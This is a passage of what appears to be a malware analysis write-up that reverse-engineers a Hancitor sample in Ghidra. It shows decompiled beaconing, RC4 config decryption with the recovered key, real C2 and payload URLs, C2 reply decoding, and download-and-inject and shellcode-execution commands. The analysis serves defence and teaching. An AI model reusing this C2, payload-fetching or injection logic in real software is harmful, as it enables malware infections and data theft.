"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  CHAR local_944 [2048];
...
  mw_get_domains(local_944);
...
    pCVar3 = local_944;
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```


`mw_get_system_info_w` determines the architecture (64 bit or 32 bit):

```c
undefined4 mw_get_system_info_w(void)

{
  undefined4 uVar1;
  _SYSTEM_INFO local_30;
  FARPROC local_c;
  HMODULE local_8;
  
  mw_memset((undefined *)&local_30,0,0x24);
  local_8 = GetModuleHandleA(s_kernel32.dll_10004308);
  if (local_8 == (HMODULE)0x0) {
    uVar1 = 0;
  }
  else {
    local_c = GetProcAddress(local_8,s_GetNativeSystemInfo_10004318);
    if (local_c == (FARPROC)0x0) {
      GetSystemInfo(&local_30);
    }
    else {
      (*local_c)(&local_30);
    }
    if (local_30.u.s.wProcessorArchitecture == 9) {
      uVar1 = 1;
    }
    else {
      uVar1 = 0;
    }
  }
  return uVar1;
}
```
> [`GetNativeSystemInfo`](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getnativesysteminfo)

> [`GetSystemInfo`](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo)

Depending on the result, different ID strings are used (`(x32)` or `(x64)`):

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  int local_24;
...
  local_24 = mw_get_system_info_w();
  if (local_24 == 1) {
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
  }
  else {
...
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_10004238,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
  }
```

```
                             s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8     XREF[1]:     mw_collect_and_send_info:10001b5
        100041f8 47 55 49        ds         "GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE
                 44 3d 25 
                 49 36 34 
        10004237 00              ??         00h

```

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```

```
                             s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_10004238     XREF[1]:     mw_collect_and_send_info:10001b9
        10004238 47 55 49        ds         "GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE
                 44 3d 25 
                 49 36 34 
        10004277 00              ??         00h
```

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x32)"
```

The malware contains a configuration data block which is encrypted via symmetric encryption and the key is hardcoded into the binary. This is a simple obfuscation strategy to defend against tools like `strings`.

```c
BYTE * mw_decrypt_config_w(void)

{
  if (DAT_10007264 == (BYTE *)0x0) {
    DAT_10005000 = 0;
    DAT_10007264 = (BYTE *)mw_heap_alloc_w(0x2000);
    mw_memcpy(DAT_10007264,&DAT_10005018,0x2000);
    mw_decrypt_config(DAT_10007264,0x2000,&DAT_10005010,8);
  }
  return DAT_10007264;
}
```
Where `DAT_10005010` is the key (length = 0x8) and `DAT_10005018` is the data (length = 0x2000). Both of them is passed to `mw_decrypt_config` which handles the decryption using the Windows API.

> **Ghidra note 3**
> 
> `Equate`s can be used to look up magic numbers in Windows headers. It can be opened by right clicking on a number in either the listing or decompiler view and pressing `E` or selecting `Set Equate...`.
> 
> ![ghidra-equate-0]({{site.baseurl}}/assets/hancitor-analysis/ghidra-equate-0.png)
> 
> Before:
> 
> ```c
> CryptCreateHash(local_c,0x8004,0,0,&local_8)
> ```
> After:
> 
> ```c
> CryptCreateHash(local_c,CALG_SHA1,0,0,&local_8)
> ```

We are interested mainly in the `CryptCreateHash` and `CryptDeriveKey` calls where we can see that SHA1 is used to derive the key and RC4 is used as the encryption algorithm. There is an other important detail here which is not immediately obvious: the number 0x280011 passed to `CryptDeriveKey`. When we try to look it up in `Equate`s nothing shows up. The reason is that this number is a combination of multiple flags. According to the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey):

> The key size, representing the length of the key modulus in bits, is set with the upper 16 bits of this parameter.

This means that in our case the key is 5 bytes long:

0x280011 = 0b0000 0000 0010 1000 0000 0000 0001 0001 where the upper 16 bits are 0b0000 0000 0010 1000 which is 40 bits or 5 bytes.

```c
DWORD __cdecl mw_decrypt_config(BYTE *param_1,DWORD param_2,BYTE *param_3,DWORD param_4)

{
  BOOL BVar1;
  DWORD local_14;
  HCRYPTKEY local_10;
  HCRYPTPROV local_c;
  HCRYPTHASH local_8;
  
  local_10 = 0;
  local_8 = 0;
  local_c = 0;
  local_14 = 0;
  BVar1 = CryptAcquireContextA(&local_c,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);
  if ((((BVar1 != 0) && (BVar1 = CryptCreateHash(local_c,CALG_SHA1,0,0,&local_8), BVar1 != 0)) &&
      (BVar1 = CryptHashData(local_8,param_3,param_4,0), BVar1 != 0)) &&
     ((BVar1 = CryptDeriveKey(local_c,CALG_RC4,local_8,0x280011,&local_10), BVar1 != 0 &&
      (BVar1 = CryptDecrypt(local_10,0,1,0,param_1,&param_2), BVar1 != 0)))) {
    local_14 = param_2;
  }
  if (local_8 != 0) {
    CryptDestroyHash(local_8);
    local_8 = 0;
  }
  if (local_10 != 0) {
    CryptDestroyKey(local_10);
    local_10 = 0;
  }
  if (local_c != 0) {
    CryptReleaseContext(local_c,0);
  }
  return local_14;
}
```

> [`CryptAcquireContextA`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta)

> [`CryptCreateHash`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash)

> [`CryptHashData`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-crypthashdata)

> [`CryptDeriveKey`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey)

> [`CryptDecrypt`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt)

> [`CryptDestroyHash`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdestroyhash)

> [`CryptDestroyKey`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdestroykey)

> [`CryptReleaseContext`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptreleasecontext)

Now that we know the necessary details, we can decrypt the config data block. Researchers frequently use [CyberChef](https://gchq.github.io/CyberChef/) which can be used to create and share a proof of concept quickly:

[CyberChef (derive key)](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')SHA1(80)Take_bytes(0,10,false)&input=ZjBkYTA4ZmUyMjVkMGE4Zg)

![cyberchef-0]({{site.baseurl}}/assets/hancitor-analysis/cyberchef-0.png)

[CyberChef (decrypt config)](https://gchq.github.io/CyberChef/#recipe=RC4(%7B'option':'Hex','string':'67f6c6259f'%7D,'Hex','Latin1')&input=OTZmZmY4MjBlYzk5ZWJiYTNjZjYzMzM3ZTIxOTA3MDIyNDIyN2QzN2IxZTRjYzJmNWJlM2M2NzJlMzFjMDRkMDJhZTMwYTFiOTJiMTE1NjM0NGY4ZGQ2NWM0MGY2N2UwZGRhMzI1NzI1Y2E3M2E3ZGRkODdhNTg3MGVlYmE4MDI0Y2E2NjhkZDQxOTVkNDI4NjVkMzk0NDE0ZWQ1NjY3ZGYzZGJlNzJmNTI0MmM1NGEzZjU1MmJlMGExNjIzODNhZmFhODg3NGRhM2ZjYjFkNDU0YzBlYThmOTlmMTRmZWMzZTQ1YjNhZDE5Njc5N2ZmNTVhZGEyYTI0YTRiMjYzZGUzNGRhOTg2NDY0NWZhMDllN2MzMWIwZTIxOGViN2YwMzdiMzdhNmY1OGFiOTExZmEyODM2MjIxYWM3Yzg5MGFjNTcyMzMxMDc1OTVlY2I0NjJjY2Y0ZTYxZTM3YzBlODI4YzlkMzZiOGRlNWFlZDMyMjMwYTU2NThiZGYyZGExOTk5NmVlNTlmNWFhNmU2MmVmODQxYTFmNTUwMjUwMDk2ODgwYjIwODBhY2NiYTJhMzYzNWNlYzVhMGEzMjMyMjM2ZjlmNjcwZmViN2E4MDVmNzE5NzUxZDQ4NGEzYzZmMzMwOTgzOTRkMmZjODQ3MTViNDAxNWEzNmM2M2EzMWI0ZmIxM2QyNzhjZjUyOTk0OTM0NjVhY2E3ZDA1OGM4NWVmY2MwMzk1OTUyZDA4YjM1OGM3NTA2ZDYzM2EyNzhjYzNkNjI0Zjc1ZDM2MzIxZDZiODAxZTU2MGQxMjJkY2I3Y2M4NmMxY2E4MWE5NmU4ZTVkZmNmMTc2ZGMyNGU5MjYwMGEzMjc3NmYzYWRiNmFlM2JjZmZlZjg4M2ZmOTJlYTY4YzBlNDZlOTFmYTMxNWViMjEzNjAyZmFjYWUwMjk3YzFmYjY2YTk4Y2JiZmJmYWVjNjllNTBhNmZmMTE2MjhkNjY1ZTg2YjkzZTk1MTc3OGJmNWUyYTNkNTc0YzlkNDMzMTQ2NjIxZjMyNTc5NWVkZDMwNzViZTAwN2FiZmQyZGJjNmFkYjg0ZTM2OTkzMjZiMTFlMzZmN2VlZjIxN2UyYTYwYjAxOWM3OWYyZjlmOTBiYzMwMGNkNzMzZTg5MzZjYzEzYTNhNzlkN2NhYWQ0MWJjNzEyOTRhNWM2ODUxYjlmYjY1NTVjZDRmODZjNzU4OGY3NDZhYzY2OWE3YTExZDg1YjZhNTI1MDNjOWJlODU2OGFmOGFiNWQ5YmE3YWU5YjJhYTUzN2I4MzM0ZjVlNTljNzIwM2ZmNDAzMzYzYTUwMTllM2MxZGU1ZTJiNDM1MTI4MjdjYmI0ZTljZDBlNjgyZWM1NDE3OTQ5MjUyNDZiNWE0Zjc1ZjAxNDk4MjM4NDk2ZWQyNGExYWY3YTRhZjBhZDM3ZGU1NDJiYWE2ODYyOWJlYWEyYjJjNWQwMGU4M2E4MWU3YWIwNWM2MGIyOGRmY2I4MjJlMWJiNzdhZGMxOGVmNzdhNjc2NThiNTAwMmZhNGIzZjEzMGMwZGMzNTlhNzU5YjZlODMwNmY3OTBjOWE0MTBmZTk5YjBlNzVkMjkwZGJhYzNiMDY0YzY2OWM3MjUzYTkxOTRlNTA4ZjVlNjE4YTc0NGEwNTVhNWY4NmM3ZjkwOTU2ZjMzNzBhOWE4NDI5Y2M2MDY1YzIwZWZjYmY1OA)

![cyberchef-1]({{site.baseurl}}/assets/hancitor-analysis/cyberchef-1.png)

My personal preference is to implement a Ghidra script which fully automates this process. I have implemented 2 Hancitor config extractors:
- [`HancitorConfigExtractor`](https://github.com/gemesa/ghidra-scripts/blob/main/HancitorConfigExtractor.java)
- [`HancitorConfigExtractor2`](https://github.com/gemesa/ghidra-scripts/blob/main/HancitorConfigExtractor2.java)

The goal is the same in case of both but there is a difference in the implementation. `HancitorConfigExtractor.java` looks for the following instruction pattern to find the configuration key and data blocks:

```
		100025fe 6a 08           PUSH       0x8
		10002600 68 10 50        PUSH       DAT_10005010
		         00 10
		10002605 68 00 20        PUSH       0x2000
		         00 00
		1000260a a1 64 72        MOV        EAX,[DAT_10007264]
		         00 10
		1000260f 50              PUSH       EAX
		10002610 e8 bb 06        CALL       mw_decrypt_config
		         00 00
```
`HancitorConfigExtractor2.java` examines the `.data` section and is based on the fact that the key starts at offset 0x10 and the data starts at offset 0x18 in this section.

There is a high chance these config extractors will work with other Hancitor variants. Malware authors a lot of times do not recompile the whole binary, instead they just replace the configuration in new samples (when their C2 servers are shut down for example).

```
HancitorConfigExtractor.java> Running...
HancitorConfigExtractor.java> key address: 0x10005010
HancitorConfigExtractor.java> data address: 0x10005018
HancitorConfigExtractor.java> key data: 0xf0da08fe225d0a8f
HancitorConfigExtractor.java> derived key: 0x67f6c6259f
HancitorConfigExtractor.java> decrypted config: 2508_bqplf......http://intakinger.com/8/forum.php|http://idgentexpliet.ru/8/forum.php|http://declassivan.ru/8/forum.php|...[redacted]
HancitorConfigExtractor.java> Finished!
```

```
HancitorConfigExtractor2.java> Running...
HancitorConfigExtractor2.java> key address: 0x10005010
HancitorConfigExtractor2.java> data address: 0x10005018
HancitorConfigExtractor2.java> key data: 0xf0da08fe225d0a8f
HancitorConfigExtractor2.java> derived key: 0x67f6c6259f
HancitorConfigExtractor2.java> decrypted config: 2508_bqplf......http://intakinger.com/8/forum.php|http://idgentexpliet.ru/8/forum.php|http://declassivan.ru/8/forum.php|...[redacted]
HancitorConfigExtractor2.java> Finished!
```

The dots represent nullbytes. Most of the decrypted config is straightforward: those URLs are C2 servers. There is a strange string at the start though: `2508_bqplf`. If we look at the following snippets:

```c
DWORD __cdecl mw_decrypt_config(BYTE *param_1,DWORD param_2,BYTE *param_3,DWORD param_4)

{
...
      (BVar1 = CryptDecrypt(local_10,0,1,0,param_1,&param_2), BVar1 != 0)))) {
```

```c
BYTE * mw_decrypt_config_w(void)

{
...
    mw_decrypt_config(DAT_10007264,0x2000,&DAT_10005010,8);
...
  return DAT_10007264;
```

We can see that `DAT_10007264` contains the decrypted string. This means that this strange-looking string is the build version and it is added as `BUILD` to the victim ID string.

```
"GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
```

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
    pBVar1 = mw_decrypt_config_w();
    wsprintfA(local_1944,s_GUID=%I64u&BUILD=%s&INFO=%s&EXT=_100041f8,(undefined4)local_20,
              local_20._4_4_,pBVar1,pCVar2,pCVar3,pCVar4,uVar5,uVar6);
```

At this point the victim ID string is fully assembled and ready to be sent to a C2 server found in the configuration.

The sample then iterates over all 3 C2 URLs and tries to send the previously assembled string to them one by one via HTTP POST requests.

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
  BYTE *pBVar1;
...
  local_18 = 1;
  while( true ) {
    if (local_18 != 1) {
      return 0;
    }
    if (*DAT_100072a0 == '\0') {
      local_18 = mw_parse_c2_urls(DAT_100072a0);
    }
    local_8 = mw_handle_http_request_with_header
                        (DAT_100072a0,local_1944,(int)param_1,param_2,param_3);
    if (local_8 == 1) {
      local_8 = mw_check_pattern(param_1);
    }
    if (local_8 == 1) break;
    *DAT_100072a0 = '\0';
  }
  return 1;
}
```

`mw_parse_c2_urls` returns 1 if there are more URLs in the list and returns 0 if there are no more.

```c
int __cdecl mw_parse_c2_urls(BYTE *param_1)

{
  BYTE BVar1;
  BYTE *pBVar2;
  
  if ((DAT_10007268 == (BYTE *)0x0) && (DAT_10007268 = DAT_1000726c, DAT_1000726c == (BYTE *)0x0)) {
    pBVar2 = mw_decrypt_config_w();
    DAT_10007268 = pBVar2 + 0x10;
  }
  for (; (*DAT_10007268 != '|' && (*DAT_10007268 != '\0')); DAT_10007268 = DAT_10007268 + 1) {
    *param_1 = *DAT_10007268;
    param_1 = param_1 + 1;
  }
  *param_1 = '\0';
  if (*DAT_10007268 == '|') {
    DAT_10007268 = DAT_10007268 + 1;
  }
  BVar1 = *DAT_10007268;
  if (BVar1 == '\0') {
    DAT_10007268 = (BYTE *)0x0;
  }
  return (uint)(BVar1 != '\0');
}
```

Call graph of `mw_handle_http_request_with_header`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_handle_http_request_with_header @ 100028d0
  mw_memset @ 100014a0
  lstrlenA @ EXTERNAL:0000011b
  InternetCrackUrlA @ EXTERNAL:00000052
  mw_open_connection @ 100024f0
    InternetOpenA @ EXTERNAL:0000004e
  InternetConnectA @ EXTERNAL:00000057
  HttpOpenRequestA @ EXTERNAL:00000053
  InternetCloseHandle @ EXTERNAL:00000050
  InternetQueryOptionA @ EXTERNAL:00000055
  InternetSetOptionA @ EXTERNAL:00000054
  HttpSendRequestA @ EXTERNAL:0000004f
  HttpQueryInfoA @ EXTERNAL:00000051
  InternetReadFile @ EXTERNAL:00000056

OrderedCallGraphGenerator.java> Finished!
```

If the response is 200 (HTTP OK), `InternetReadFile` reads the data via the handle opened by `HttpOpenRequestA` and `mw_handle_http_request_with_header` returns 1.

```c
undefined4 __cdecl
mw_handle_http_request_with_header
          (undefined4 param_1,LPCSTR param_2,int param_3,int param_4,int *param_5)

...
            local_1c = 0;
...
              HttpQueryInfoA(local_8,0x20000013,&local_1c,&local_34,0);
              if ((local_1c == 200) && (param_3 != 0)) {
                iVar1 = InternetReadFile(local_8,param_3,param_4 + -1,param_5);
                if ((iVar1 == 0) || (*param_5 == 0)) {
                  *param_5 = 0;
                }
                else {
                  *(undefined *)(param_3 + *param_5) = 0;
                }
              }
            }
            InternetCloseHandle(local_8);
            InternetCloseHandle(local_c);
            if (local_1c == 200) {
              uVar2 = 1;
            }
            else {
              uVar2 = 0;
            }
          }
        }
      }
    }
    else {
      uVar2 = 0;
    }
  }
  return uVar2;
}
```

> [`HttpOpenRequestA`](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta)

> [`HttpQueryInfoA`](https://www.google.com/search?client=firefox-b-d&q=HttpQueryInfoA)

> [`InternetReadFile`](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)

If `mw_handle_http_request_with_header` returns with 1 (success), the first 4 bytes of the received data are validated via `mw_check_pattern`. If this validation check also passes, the function breaks from the while loop and returns 1. Otherwise it sets `DAT_100072a0` to `'\0'` which means `mw_parse_c2_urls` will return the next URL from the list and the next request will be sent to that URL.

```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
  local_18 = 1;
  while( true ) {
    if (local_18 != 1) {
      return 0;
    }
    if (*DAT_100072a0 == '\0') {
      local_18 = mw_parse_c2_urls(DAT_100072a0);
    }
    local_8 = mw_handle_http_request_with_header
                        (DAT_100072a0,local_1944,(int)param_1,param_2,param_3);
    if (local_8 == 1) {
      local_8 = mw_check_pattern(param_1);
    }
    if (local_8 == 1) break;
    *DAT_100072a0 = '\0';
  }
  return 1;
}
```

```c
undefined4 __cdecl mw_check_pattern(char *param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint local_8;
  
  local_8 = 0;
  while( true ) {
    if (3 < local_8) {
      if (0x9b - param_1[1] == (int)param_1[2]) {
        if (0x9b - *param_1 == (int)param_1[3]) {
          uVar2 = 1;
        }
        else {
          uVar2 = 0;
        }
      }
      else {
        uVar2 = 0;
      }
      return uVar2;
    }
    iVar1 = mw_is_uppercase(param_1[local_8]);
    if (iVar1 == 0) break;
    local_8 = local_8 + 1;
  }
  return 0;
}
```

If all URLs are exhausted, `mw_parse_c2_urls` returns 0 and `mw_collect_and_send_info` also returns 0.

The data read earlier by `InternetReadFile` is then passed to `mw_base64_decode_and_xor`. Note that the first 4 bytes are not passed. The reason is that these were only necessary for validation and have been validated in `mw_check_pattern`.

```c
void mw_main(void)

{
...
  char *local_14;
...
  local_14 = (char *)mw_heap_alloc_w(0x100000);
...
    iVar1 = mw_collect_and_send_info(local_14,local_c,&local_24);
...
      local_24 = mw_base64_decode_and_xor((int)(local_14 + 4),(int)local_18);
...
```
```c
undefined4 __cdecl mw_collect_and_send_info(char *param_1,int param_2,int *param_3)

{
...
    local_8 = mw_handle_http_request_with_header
                        (DAT_100072a0,local_1944,(int)param_1,param_2,param_3);
...
```
```c
undefined4 __cdecl
mw_handle_http_request_with_header
          (undefined4 param_1,LPCSTR param_2,int param_3,int param_4,int *param_5)

{
...
                iVar1 = InternetReadFile(local_8,param_3,param_4 + -1,param_5);
...
```

According to the documentation of [`InternetReadFile`](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile), the 2. parameter is `[out] lpBuffer`:
> Pointer to a buffer that receives the data.

`mw_base64_decode_and_xor` decodes the received message via a base64 decoding and XOR operation:

```c
int __cdecl mw_base64_decode_and_xor(int param_1,int param_2)

{
  uint uVar1;
  uint local_8;
  
  uVar1 = mw_base64_decode(param_1,param_2);
  for (local_8 = 0; local_8 < uVar1; local_8 = local_8 + 1) {
    *(byte *)(param_2 + local_8) = *(byte *)(param_2 + local_8) ^ 0x7a;
  }
  *(undefined *)(param_2 + uVar1) = 0;
  return uVar1 + 1;
}
```

It is always a good idea to analyze malware samples without an active internet connection. For this reason I could not test myself what the message received by the C2 server looks like, but some examples are available [here](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/decoding-hancitor-malware-with-suricata-and-lua/):

Encoded message:

```
ARZAEg4OCkBVVR0PAFcUFx0YVAgPVQ0KVxkVFA4fFA5VChYPHRMUCVUZFRQOGxkOVxwVCBdXTVVLBhIODgpAVVUYCBUPDR8ICRIPAwlUFBZVDQpXGRUUDh8UDlUKFg8dExQJVUNIQ0lCHhlJGENKS1VLBwEYQBIODgpAVVUdDwBXFBcdGFQID1UNClcZFRQOHxQOVQoWDx0TFAlVGRUUDhsZDlccFQgXV01VSAYSDg4KQFVVGAgVDw0fCAkSDwMJVBQWVQ0KVxkVFA4fFA5VChYPHRMUCVVDSENJQh4ZSRhDSktVSAcBCEASDg4KQFVVHQ8AVxQXHRhUCA9VDQpXGRUUDh8UDlUKFg8dExQJVRkVFA4bGQ5XHBUIF1dNVUkGEg4OCkBVVRgIFQ8NHwgJEg8DCVQUFlUNClcZFRQOHxQOVQoWDx0TFAlVQ0hDSUIeGUkYQ0pLVUkH
```

Decoded message:

```
{l:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/1|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/1}{b:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/2|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/2}{r:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/3|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/3}
```

The decoded message is then passed to `mw_extract_cmd` for further processing, which extracts the content between the first set of {} it encounters and returns a pointer showing where it finished reading.

```c
void mw_main(void)

{
...
  char *local_18;
...
  char *local_10;
  SIZE_T local_c;
...
  local_c = 0x100000;
  char *local_8;
...
  local_18 = (char *)mw_heap_alloc_w(local_c);
  local_8 = (char *)mw_heap_alloc_w(0x1000);
...
      local_24 = mw_base64_decode_and_xor((int)(local_14 + 4),(int)local_18);
      local_10 = local_18;
...
        local_10 = mw_extract_cmd(local_10,local_8);
...
```

```c
char * __cdecl mw_extract_cmd(char *param_1,undefined *param_2)

{
  int local_8;
  
  *param_2 = 0;
  if (param_1 != (char *)0x0) {
    for (; *param_1 != '\0'; param_1 = param_1 + 1) {
      if (*param_1 == '{') {
        local_8 = 0;
        while( true ) {
          param_1 = param_1 + 1;
          if (*param_1 == '\0') {
            return (char *)0x0;
          }
          if (*param_1 == '}') break;
          param_2[local_8] = *param_1;
          local_8 = local_8 + 1;
        }
        param_2[local_8] = 0;
        return param_1;
      }
    }
  }
  return (char *)0x0;
}
```

Input:

```
{l:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/1|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/1}{b:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/2|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/2}{r:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/3|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/3}
```

Extracted output:

```
l:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/1|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/1
```

Remaining:

```
}{b:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/2|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/2}{r:http://guz-nmgb.ru/wp-content/plugins/contact-form-7/3|http://brouwershuys.nl/wp-content/plugins/92938dc3b901/3}
```

The extracted command is then validated:


```c
void mw_main(void)

{
...
  char *local_8;
...
  local_8 = (char *)mw_heap_alloc_w(0x1000);
...
        local_10 = mw_extract_cmd(local_10,local_8);
        iVar1 = mw_check_cmd(local_8);
...
```

```c
undefined4 __cdecl mw_check_cmd(char *param_1)

{
  char *local_8;
  
  local_8 = s_ncdrleb_100041f0;
  if (param_1[1] == ':') {
    for (; *local_8 != '\0'; local_8 = local_8 + 1) {
      if (*local_8 == *param_1) {
        return 1;
      }
    }
  }
  return 0;
}
```

The command is valid if the first character is part of the `ncdrleb` string, and the second character is a `:`.

The valid commands are passed to `mw_execute_cmd` for execution:


```c
void mw_main(void)

{
...
  int iVar1;
...
  int local_1c;
...
  char *local_8;
...
  local_8 = (char *)mw_heap_alloc_w(0x1000);
...
        iVar1 = mw_check_cmd(local_8);
        if (iVar1 == 1) {
          local_1c = 0;
          iVar1 = mw_execute_cmd(local_8,&local_1c);
...
```

```c
int __cdecl mw_execute_cmd(char *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  if (param_1[1] == ':') {
    switch(*param_1) {
    case 'b':
      iVar2 = mw_launch_and_inject_svchost_w(param_1 + 2);
      *param_2 = iVar2;
      iVar1 = 1;
      break;
    default:
      iVar1 = 0;
      break;
    case 'e':
      iVar2 = mw_execute_pe_w(param_1 + 2,0);
      *param_2 = iVar2;
      iVar1 = 1;
      break;
    case 'l':
      iVar2 = mw_execute_shellcode_w(param_1 + 2,1,1);
      *param_2 = iVar2;
      iVar1 = 1;
      break;
    case 'n':
      *param_2 = 1;
      iVar1 = 1;
      break;
    case 'r':
      iVar2 = mw_drop_and_execute_w(param_1 + 2);
      *param_2 = iVar2;
      iVar1 = 1;
    }
  }
  else {
    iVar1 = 0;
  }
  return iVar1;
}
```

`mw_execute_cmd` supports multiple execution modes. It first checks if the 1. character is `:`, then executes the command.

#### command `b`

Summary: this command downloads the PE file (available at the specified URL(s)), then launches an `svchost.exe` process and injects it into that.

```c
int __cdecl mw_launch_and_inject_svchost_w(char *param_1)

{
  char *pcVar1;
  int iVar2;
  int local_10;
  SIZE_T local_8;
  
  local_8 = 0x500000;
  pcVar1 = (char *)mw_heap_alloc_w(0x500000);
  iVar2 = mw_download_pe_file(param_1,pcVar1,local_8,&local_8,1);
  if (iVar2 == 1) {
    mw_launch_and_inject_svchost(pcVar1,local_8);
  }
  local_10 = (int)(iVar2 == 1);
  mw_heap_free_w(pcVar1);
  return local_10;
}
```

Call graph of `mw_launch_and_inject_svchost_w`:

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_launch_and_inject_svchost_w @ 10001e80
  mw_heap_alloc_w @ 10001390
    GetProcessHeap @ EXTERNAL:00000114
    HeapAlloc @ EXTERNAL:0000005b
  mw_download_pe_file @ 10002230
    mw_check_pipe_delimiter @ 10002880
    mw_handle_http_request @ 10001fe0
      mw_memset @ 100014a0
      InternetCrackUrlA @ EXTERNAL:00000052
      mw_open_connection @ 100024f0
        InternetOpenA @ EXTERNAL:0000004e
      InternetConnectA @ EXTERNAL:00000057
      HttpOpenRequestA @ EXTERNAL:00000053
      InternetCloseHandle @ EXTERNAL:00000050
      InternetQueryOptionA @ EXTERNAL:00000055
      InternetSetOptionA @ EXTERNAL:00000054
      HttpSendRequestA @ EXTERNAL:0000004f
      HttpQueryInfoA @ EXTERNAL:00000051
      InternetReadFile @ EXTERNAL:00000056
    mw_check_custom_signature @ 10002810
    mw_decrypt_and_decompress @ 10001d40
      mw_heap_alloc_w @ 10001390 [already visited!]
      RtlDecompressBuffer @ EXTERNAL:00000059
      mw_memcpy @ 10001450
      mw_heap_free_w @ 100013d0
        HeapFree @ EXTERNAL:00000115
    mw_check_mz_header @ 10002b40
    mw_extract_next_url @ 10002720
  mw_launch_and_inject_svchost @ 10002b80
    mw_check_mz_header @ 10002b40 [already visited!]
    mw_launch_svchost @ 10002c40
      mw_memset @ 100014a0 [already visited!]
      GetEnvironmentVariableA @ EXTERNAL:0000011f
      lstrcatA @ EXTERNAL:0000005d
      CreateProcessA @ EXTERNAL:00000120
    mw_inject @ 10003270
      VirtualAllocEx @ EXTERNAL:0000012f
      mw_heap_alloc_w @ 10001390 [already visited!]
      mw_map_pe @ 10003a00
        mw_memcpy @ 10001450 [already visited!]
        mw_process_relocs @ 10003470
      WriteProcessMemory @ EXTERNAL:00000130
      mw_heap_free_w @ 100013d0 [already visited!]
      VirtualFreeEx @ EXTERNAL:00000131
    mw_inject_and_resume @ 100037e0
      mw_memset @ 100014a0 [already visited!]
      GetThreadContext @ EXTERNAL:00000135
      WriteProcessMemory @ EXTERNAL:00000130
      SetThreadContext @ EXTERNAL:00000136
      ResumeThread @ EXTERNAL:00000137
    GetProcessId @ EXTERNAL:0000011c
    TerminateProcess @ EXTERNAL:0000011d
    CloseHandle @ EXTERNAL:0000011e
  mw_heap_free_w @ 100013d0 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```

If multiple URLs are specified, it attempts to download a PE file from the multiple fallback URLs. If one URL fails, it tries the next one.


```c
int __cdecl
mw_download_pe_file(char *param_1,char *param_2,SIZE_T param_3,uint *param_4,int param_5)

{
  int iVar1;
  uint uVar2;
  char local_204 [512];
  
  iVar1 = mw_check_pipe_delimiter(param_1);
  if ((iVar1 == 0) &&
     (iVar1 = mw_handle_http_request(param_1,(int)param_2,param_3,(int *)param_4), iVar1 == 1)) {
